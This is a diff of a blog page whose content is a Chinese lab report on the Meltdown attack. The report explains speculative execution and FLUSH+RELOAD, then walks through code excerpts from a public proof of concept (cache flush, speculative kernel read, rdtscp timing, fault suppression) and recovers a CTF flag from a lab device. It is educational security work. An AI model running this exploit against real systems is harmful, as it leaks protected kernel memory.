@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../" aria-busy="true">
   <a href="../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../"
          data-navigation-hidden="false">
       
@@ -770,20 +770,58 @@
   
 
 
+<!-- blog-edit-start:190b515bfff88f5b:b0 -->
+
 <h1 id="meltdown">meltdown 侧信道攻击实验报告</h1>
+<!-- blog-edit-end:190b515bfff88f5b:b0 -->
+
 <div class="file-actions" data-image-edit-revision="b47128db57d0726af415100c49af1220ac10dba46d34b06a0e9aeef218be9dd5" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cmeltdown%5C%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cmeltdown" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\meltdown\实验报告.md">复制路径</span></div>
 
+<!-- blog-edit-start:190b515bfff88f5b:b1 -->
+
 <p>研究生一门课的一个作业。Meltdown 漏洞是一个很著名的漏洞，利用了缓存延时，很精妙。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b1 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b2 -->
+
 <h2 id="_1">攻击原理</h2>
+<!-- blog-edit-end:190b515bfff88f5b:b2 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b3 -->
+
 <p>正常情况下，用户程序访问内核地址会因为权限问题触发异常，从而无法达到目的。比如汇编语句 <code>mov rax, byte [xxx]</code>，当 xxx 是内核地址时，用户执行这条指令会被 CPU 标记为非法，触发异常后会把 <code>rax</code> 清零。所以即使忽略掉异常，后续指令仍然无法得到内核地址 xxx 的内容。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b3 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b4 -->
+
 <p>上述的保护方式看起来十分坚固，但是 meltdown 攻击利用 CPU 会进行乱序执行的特点找到了突破口。如  C 语言语句 <code>char data = *(char*) xxx; variable = arrary[data * 4096]</code>，转换成如下汇编语句。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b4 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b5 -->
+
 <div class="language-c highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos="1 "></span><span class="n">mov</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="n">byte</span><span class="w"> </span><span class="p">[</span><span class="n">xxx</span><span class="p">]</span><span class="w"> </span><span class="c1">// illegal</span>
 </span><span id="__span-0-2"><span class="linenos" data-linenos="2 "></span><span class="n">shl</span><span class="w"> </span><span class="n">rax</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC</span><span class="w"> </span><span class="c1">// rax * 4096</span>
 </span><span id="__span-0-3"><span class="linenos" data-linenos="3 "></span><span class="n">mov</span><span class="w"> </span><span class="n">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">rbx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rax</span><span class="p">]</span><span class="w"> </span><span class="c1">// rbx = array, rcx = variable</span>
 </span></code></pre></div>
+<!-- blog-edit-end:190b515bfff88f5b:b5 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b6 -->
+
 <p>CPU 乱序执行这段代码会让<strong>在第一条语句触发异常前，部分执行第二条、第三条语句</strong>。比如就有可能在触发异常前，CPU 已经计算好了 <code>rbx + rax*4096</code>，而这里的 <code>rax</code> 就是内核地址中的内容。但是异常触发后仍然是一切可利用的信息都会消失，比如上述语句中<code>rax</code> 和 <code>rbx</code> 都会被清零。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b6 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b7 -->
+
 <p>但是实际上，并不是所有可利用的消息都被清除掉了：<strong>假如 <code>rbx + rax*4096</code> 这一地址不在 cache 中，那么 CPU 会将这一地址放入 cache，并且异常触发不会从 cache 中擦除！</strong></p>
+<!-- blog-edit-end:190b515bfff88f5b:b7 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b8 -->
+
 <p>因此可以通过 cache 进行信息泄露，具体方式是判断数据访问时间的长短。数据在和不在 cache 中，访问该数据的时间相对来说是有不少差别的。方法的具体名称叫做 FLUSH + RELOAD，具体做法如下。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b8 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b9 -->
+
 <ol>
 <li>
 <p>先清除掉 cache 内容，确保 array 即 <code>rbx</code> 这一段内容都不在 cache 中</p>
@@ -795,19 +833,55 @@
 <p>从 <code>rbx + 0*4096</code> 开始遍历整个 array，假如某个地址访问时间相对与其他地址时间较短，那么就可以推出 <code>rax</code> ，即内核地址内容</p>
 </li>
 </ol>
+<!-- blog-edit-end:190b515bfff88f5b:b9 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b10 -->
+
 <h2 id="_2">攻击方法</h2>
+<!-- blog-edit-end:190b515bfff88f5b:b10 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b11 -->
+
 <p><strong>本次攻击使用了该项目的代码：<a href="https://github.com/paboldin/meltdown-exploit">paboldin/meltdown-exploit: Meltdown Exploit PoC (github.com)</a></strong>。下面主要是对该项目的攻击代码进行分析。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b11 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b12 -->
+
 <h3 id="_3">攻击流程</h3>
+<!-- blog-edit-end:190b515bfff88f5b:b12 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b13 -->
+
 <p>攻击流程分为清除 cache 内容，将数据放入 cache，获取访问数据时间，推断目标数据。最后对这几个部分进行汇总。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b13 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b14 -->
+
 <h4 id="cache">清除 cache 内容</h4>
+<!-- blog-edit-end:190b515bfff88f5b:b14 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b15 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">clflush_target</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 </span><span id="__span-1-2"><span class="linenos" data-linenos="2 "></span><span class="p">{</span>
 </span><span id="__span-1-3"><span class="linenos" data-linenos="3 "></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">VARIANTS_READ</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
 </span><span id="__span-1-4"><span class="linenos" data-linenos="4 "></span><span class="w">        </span><span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_array</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">TARGET_SIZE</span><span class="p">]);</span>
 </span><span id="__span-1-5"><span class="linenos" data-linenos="5 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:190b515bfff88f5b:b15 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b16 -->
+
 <p>利用 <code>_mm_clflush</code> 即可实现该功能。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b16 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b17 -->
+
 <h4 id="cache_1">数据放入 cache</h4>
+<!-- blog-edit-end:190b515bfff88f5b:b17 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b18 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__attribute__</span><span class="p">((</span><span class="n">noinline</span><span class="p">))</span><span class="w"> </span>
 </span><span id="__span-2-2"><span class="linenos" data-linenos=" 2 "></span><span class="n">speculate</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
 </span><span id="__span-2-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
@@ -832,11 +906,23 @@
 </span><span id="__span-2-22"><span class="linenos" data-linenos="22 "></span><span class="w">    </span><span class="p">);</span>
 </span><span id="__span-2-23"><span class="linenos" data-linenos="23 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:190b515bfff88f5b:b18 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b19 -->
+
 <ol>
 <li>第 11-14 行是攻击原理中所讲的代码，通过这段代码就可以让 <code>rbx + rax*4096</code> 这一块地址放入 cache 中。</li>
 <li>第 07-09 行是进行 300 次 <code>add rax, 0x141</code>，执行这段代码因为有依赖关系，所以会顺序执行。这样就确保执行第 11-14 行代码不会被前面的语句干扰到。</li>
 </ol>
+<!-- blog-edit-end:190b515bfff88f5b:b19 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b20 -->
+
 <h4 id="_4">获取访问数据时间</h4>
+<!-- blog-edit-end:190b515bfff88f5b:b20 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b21 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">int</span>
 </span><span id="__span-3-2"><span class="linenos" data-linenos=" 2 "></span><span class="nf">get_access_time</span><span class="p">(</span><span class="k">volatile</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
 </span><span id="__span-3-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
@@ -848,9 +934,25 @@
 </span><span id="__span-3-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">time2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">time1</span><span class="p">;</span>
 </span><span id="__span-3-10"><span class="linenos" data-linenos="10 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:190b515bfff88f5b:b21 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b22 -->
+
 <p><code>rdtscp</code> 函数通常用来测量代码的执行时间。<code>rdtscp</code> 含义是 read TSC(Time Stamp Counter) 寄存器。TSC 寄存器在每个 CPU 时钟信号到来时加 1。通过这个指令，我们可以获得纳秒级别的时间精度。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b22 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b23 -->
+
 <p>上述代码在执行两个 <code>rdtscp</code> 函数之间中把要访问的地址当成函数执行，从而可以得到访问目标地址所用的时间。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b23 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b24 -->
+
 <h4 id="_5">推断访问数据</h4>
+<!-- blog-edit-end:190b515bfff88f5b:b24 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b25 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">check</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 </span><span id="__span-4-2"><span class="linenos" data-linenos=" 2 "></span><span class="p">{</span>
 </span><span id="__span-4-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">,</span><span class="w"> </span><span class="n">mix_i</span><span class="p">;</span>
@@ -867,8 +969,20 @@
 </span><span id="__span-4-14"><span class="linenos" data-linenos="14 "></span><span class="w">    </span><span class="p">}</span>
 </span><span id="__span-4-15"><span class="linenos" data-linenos="15 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:190b515bfff88f5b:b25 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b26 -->
+
 <p>遍历 target_array 数组，并且计算访问时间，然后判断时间是否在预先设定的阈值内，若小于则记录一次。该阈值设定方法见其他注意点部分。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b26 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b27 -->
+
 <h4 id="_6">整体逻辑</h4>
+<!-- blog-edit-end:190b515bfff88f5b:b27 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b28 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos=" 1 "></span><span class="cp">#define CYCLES 1000</span>
 </span><span id="__span-5-2"><span class="linenos" data-linenos=" 2 "></span><span class="kt">int</span><span class="w"> </span><span class="nf">readbyte</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
 </span><span id="__span-5-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
@@ -898,11 +1012,35 @@
 </span><span id="__span-5-27"><span class="linenos" data-linenos="27 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">maxi</span><span class="p">;</span>
 </span><span id="__span-5-28"><span class="linenos" data-linenos="28 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:190b515bfff88f5b:b28 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b29 -->
+
 <p>执行多次清除cache→数据放入cache→获取访问时间→推断访问数据的流程。在推断访问流程即 check 函数中，每一个访问时间小于设定阈值的都会被记录一次。因此最终执行多次后，找到被记录最多次的数字，该数字即为该位置中的内容。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b29 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b30 -->
+
 <p>此外执行流程中执行了函数 <code>__mm_mfence</code> ，该函数作用是读写串行化，即防止 CPU 乱序执行指令，保证执行数据放入 cache 这一操作时不会被前面的指令干扰。其目的和数据放入 cache 的第 7-9 行功能一样。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b30 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b31 -->
+
 <h3 id="_7">其他注意点</h3>
+<!-- blog-edit-end:190b515bfff88f5b:b31 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b32 -->
+
 <p>这一部分讲一下其他的注意点，包括处理异常和设定时间阈值。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b32 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b33 -->
+
 <h4 id="_8">处理异常</h4>
+<!-- blog-edit-end:190b515bfff88f5b:b33 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b34 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos="1 "></span><span class="kt">int</span><span class="w"> </span><span class="nf">set_signal</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 </span><span id="__span-6-2"><span class="linenos" data-linenos="2 "></span><span class="p">{</span>
 </span><span id="__span-6-3"><span class="linenos" data-linenos="3 "></span><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigaction</span><span class="w"> </span><span class="n">act</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
@@ -913,8 +1051,20 @@
 </span><span id="__span-6-8"><span class="linenos" data-linenos="8 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">act</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
 </span><span id="__span-6-9"><span class="linenos" data-linenos="9 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:190b515bfff88f5b:b34 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b35 -->
+
 <p>通过重载 <code>sigaction</code> 达到忽略异常的目的。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b35 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b36 -->
+
 <h4 id="_9">设定时间阈值</h4>
+<!-- blog-edit-end:190b515bfff88f5b:b36 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b37 -->
+
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-7-1"><span class="linenos" data-linenos=" 1 "></span><span class="cp">#define ESTIMATE_CYCLES 1000000</span>
 </span><span id="__span-7-2"><span class="linenos" data-linenos=" 2 "></span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">set_cache_hit_threshold</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 </span><span id="__span-7-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
@@ -937,11 +1087,34 @@
 </span><span id="__span-7-20"><span class="linenos" data-linenos="20 "></span><span class="w">    </span><span class="n">cache_hit_threshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mysqrt</span><span class="p">(</span><span class="n">cached</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">uncached</span><span class="p">);</span>
 </span><span id="__span-7-21"><span class="linenos" data-linenos="21 "></span><span class="p">}</span>
 </span></code></pre></div>
+<!-- blog-edit-end:190b515bfff88f5b:b37 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b38 -->
+
 <p>即分别执行多次命中 cache 和 不命中 cache 的操作，得出命中和不命中的时间，阈值最终设定为这两者的乘积的平方根。设定该阈值准确度较高。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b38 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b39 -->
+
 <h2 id="_10">攻击结果</h2>
+<!-- blog-edit-end:190b515bfff88f5b:b39 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b40 -->
+
 <p>首先确定 <code>/dev/memdev0</code> 的内容，通过给的虚拟设备源码可以知道，该内容即为内核中 flag 的地址。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b40 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b41 -->
+
 <p>然后编译 meltdown 程序，执行该程序，传入对应的地址信息即可获取 flag。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b41 -->
+
+<!-- blog-edit-start:190b515bfff88f5b:b42 -->
+
 <p>最终的结果为 <code>flag{cpu_side_channel_info_leak}</code>。</p>
+<!-- blog-edit-end:190b515bfff88f5b:b42 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\meltdown\实验报告.md" data-text-edit-revision="b47128db57d0726af415100c49af1220ac10dba46d34b06a0e9aeef218be9dd5" data-text-edit-marker="190b515bfff88f5b" data-text-edit-schema="1"></div>
 
 
 
@@ -1173,8 +1346,6 @@
         <script src="../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
